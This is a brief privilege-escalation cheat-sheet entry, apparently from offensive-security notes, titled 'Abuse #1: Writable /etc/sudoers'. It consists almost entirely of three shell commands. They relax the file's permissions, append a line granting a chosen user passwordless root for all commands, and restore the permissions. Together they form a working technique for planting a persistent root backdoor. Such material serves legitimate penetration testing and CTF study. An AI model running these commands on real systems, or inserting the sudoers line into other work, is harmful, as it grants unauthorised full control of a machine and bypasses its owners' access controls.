---
title: "sudoers"
date: 2024-7-3
tags: ["sudoers", "sudo", "privesc", "/etc/sudoers"]
---

#### Abuse #1: Writable /etc/sudoers

<div>

```console
chmod 600 /etc/sudoers
```

```console
echo '<USER>   ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
```

```console
chmod 440 /etc/sudoers
```

</div>

<br>
